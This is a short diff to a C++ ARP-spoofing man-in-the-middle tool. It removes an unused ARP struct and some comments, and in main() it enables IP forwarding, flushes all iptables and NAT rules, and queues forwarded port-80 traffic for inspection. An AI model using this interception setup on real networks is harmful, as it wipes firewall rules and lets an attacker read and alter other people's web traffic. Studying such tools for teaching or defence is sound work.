@@ -27,23 +27,6 @@
 #include <netinet/tcp.h>
 
 using namespace std;
-
-struct arp_header
-{
-    uint16_t htype;
-    uint16_t ptype;
-    uint8_t hlen;
-    uint8_t plen;
-    uint16_t opcode;
-    uint8_t sender_mac[6];
-    uint8_t sender_ip[4];
-    uint8_t target_mac[6];
-    uint8_t target_ip[4];
-};
-// struct arp_packet {
-//     struct ethhdr eth;
-//     struct arp_header arp;
-// };
 #define ETHER_HEADER_LEN sizeof(struct ether_header)
 #define ETHER_ARP_LEN sizeof(struct ether_arp)
 #define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
@@ -332,7 +315,6 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
 
 static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
-    // cout << "Packet received" << endl;
     char *packet;
     int id = 0;
     struct nfqnl_msg_packet_hdr *ph;
@@ -385,7 +367,6 @@ void analyze_packet(){
     struct iphdr *ip_header;
     struct tcphdr *tcp_header;
     struct ether_header *eth_header;
-    struct arp_header *arp_header;
     int id;
     h = nfq_open();
     if (!h)
@@ -459,8 +440,8 @@ void arp_spoofing()
 int main()
 {
     system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
-    // system("iptables -F");
-    // system("iptables -t nat -F");
+    system("iptables -F");
+    system("iptables -t nat -F");
 
     system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
     
